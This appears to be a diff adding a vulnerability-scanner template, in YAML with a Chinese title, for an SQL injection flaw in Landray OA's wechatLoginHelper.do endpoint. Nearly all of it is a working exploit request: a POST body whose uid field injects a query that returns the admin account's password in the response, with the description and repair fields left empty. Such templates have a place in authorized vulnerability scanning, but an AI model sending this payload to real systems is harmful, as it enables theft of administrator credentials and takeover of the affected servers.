@@ -1,0 +1,23 @@
+id:
+
+info:
+  name: 蓝凌OA wechatLoginHelper.do SQL注入漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /third/wechat/wechatLoginHelper.do
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip, deflate, br
+    Connection: close
+  data: |
+    method=edit&uid=1'and+(SELECT+'password-is:'%2BfdPassword%2B'----'+FROM+com.landray.kmss.sys.organization.model.SysOrgPerson+where+fdLoginName='admin')=1+and+'1'='1
+response1:
+  body:
+  code: password
+requests2:
+response2:
